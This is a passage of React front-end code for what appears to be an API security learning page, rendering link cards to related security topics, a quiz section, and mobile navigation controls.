                <Typography variant="h5" sx={{ fontWeight: 700, color: "#e0e0e0", mb: 3, display: "flex", alignItems: "center", gap: 2 }}>
                  <AssignmentIcon sx={{ color: "#8b5cf6" }} />
                  Related Learning Topics
                </Typography>
                <Grid container spacing={2}>
                  {[
                    {
                      title: "Web App Pentesting Guide",
                      desc: "Comprehensive web application security testing methodology",
                      link: "/learn/pentest-guide",
                      color: "#ef4444",
                      icon: <SecurityIcon />,
                    },
                    {
                      title: "SQL Injection Guide",
                      desc: "Deep dive into SQL injection techniques and prevention",
                      link: "/learn/sql-injection",
                      color: "#f59e0b",
                      icon: <StorageIcon />,
                    },
                    {
                      title: "XSS Attack Guide",
                      desc: "Cross-site scripting fundamentals and remediation",
                      link: "/learn/xss",
                      color: "#22c55e",
                      icon: <JavascriptIcon />,
                    },
                    {
                      title: "Command Injection",
                      desc: "OS command injection techniques and secure coding",
                      link: "/learn/command-injection",
                      color: "#8b5cf6",
                      icon: <TerminalIcon />,
                    },
                    {
                      title: "OWASP Top 10",
                      desc: "Understanding the most critical web application security risks",
                      link: "/learn/owasp-top-10",
                      color: "#06b6d4",
                      icon: <SecurityIcon />,
                    },
                    {
                      title: "Burp Suite Mastery",
                      desc: "Advanced techniques for the industry-standard proxy",
                      link: "/learn/burp-suite",
                      color: "#ec4899",
                      icon: <BugReportIcon />,
                    },
                  ].map((item) => (
                    <Grid item xs={12} sm={6} md={4} key={item.title}>
                      <Card
                        component={Link}
                        to={item.link}
                        sx={{
                          height: "100%",
                          bgcolor: alpha(item.color, 0.08),
                          border: `1px solid ${alpha(item.color, 0.2)}`,
                          borderRadius: 2,
                          textDecoration: "none",
                          transition: "all 0.2s",
                          "&:hover": {
                            bgcolor: alpha(item.color, 0.15),
                            borderColor: item.color,
                            transform: "translateY(-2px)",
                          },
                        }}
                      >
                        <CardContent>
                          <Box sx={{ display: "flex", alignItems: "center", gap: 1.5, mb: 1.5 }}>
                            <Box sx={{ color: item.color }}>{item.icon}</Box>
                            <Typography variant="subtitle1" sx={{ fontWeight: 700, color: "#e0e0e0" }}>
                              {item.title}
                            </Typography>
                          </Box>
                          <Typography variant="body2" sx={{ color: "grey.400" }}>
                            {item.desc}
                          </Typography>
                        </CardContent>
                      </Card>
                    </Grid>
                  ))}
                </Grid>
              </Paper>
            </Box>

            {/* Quiz Section */}
            <Box id="quiz" sx={{ mt: 4 }}>
              <QuizSection
                questions={quizPool}
                accentColor={ACCENT_COLOR}
                title="API Security Knowledge Check"
                description="Random 10-question quiz drawn from a 75-question bank each time the page loads."
                questionsPerQuiz={QUIZ_QUESTION_COUNT}
              />
            </Box>

            {/* Bottom Navigation */}
            <Box sx={{ mt: 4, textAlign: "center" }}>
              <Button
                variant="outlined"
                startIcon={<ArrowBackIcon />}
                onClick={() => navigate("/learn")}
                sx={{ borderColor: ACCENT_COLOR, color: ACCENT_COLOR, "&:hover": { bgcolor: alpha(ACCENT_COLOR, 0.1), borderColor: "#60a5fa" } }}
              >
                Back to Learning Hub
              </Button>
            </Box>

          </Grid>
        </Grid>
      </Container>

      {/* Mobile Navigation Drawer */}
      <Drawer
        anchor="left"
        open={navDrawerOpen}
        onClose={() => setNavDrawerOpen(false)}
        sx={{
          display: { xs: "block", lg: "none" },
          "& .MuiDrawer-paper": {
            width: 280,
            bgcolor: "#12121a",
            borderRight: `1px solid ${alpha(ACCENT_COLOR, 0.2)}`,
          },
        }}
      >
        <Box sx={{ p: 2 }}>
          <Box sx={{ display: "flex", justifyContent: "space-between", alignItems: "center", mb: 2 }}>
            <Typography variant="h6" sx={{ fontWeight: 700, color: ACCENT_COLOR }}>
              Contents
            </Typography>
            <IconButton onClick={() => setNavDrawerOpen(false)} sx={{ color: "grey.400" }}>
              <CloseIcon />
            </IconButton>
          </Box>
          {sidebarNav}
        </Box>
      </Drawer>

      {/* Floating Action Buttons */}
      {!isLgUp && (
        <>
          <Fab
            size="medium"
            onClick={() => setNavDrawerOpen(true)}
            sx={{
              position: "fixed",
              bottom: 80,
              right: 16,
              bgcolor: ACCENT_COLOR,
              color: "white",
              "&:hover": { bgcolor: alpha(ACCENT_COLOR, 0.8) },
            }}
          >
            <ListAltIcon />
          </Fab>
          <Fab
            size="small"
            onClick={() => window.scrollTo({ top: 0, behavior: "smooth" })}
            sx={{
              position: "fixed",
              bottom: 24,
              right: 16,
              bgcolor: alpha(ACCENT_COLOR, 0.2),
              color: ACCENT_COLOR,
              "&:hover": { bgcolor: alpha(ACCENT_COLOR, 0.3) },
            }}
          >
            <KeyboardArrowUpIcon />
          </Fab>
        </>
      )}
    </Box>
    </LearnPageLayout>
  );
}
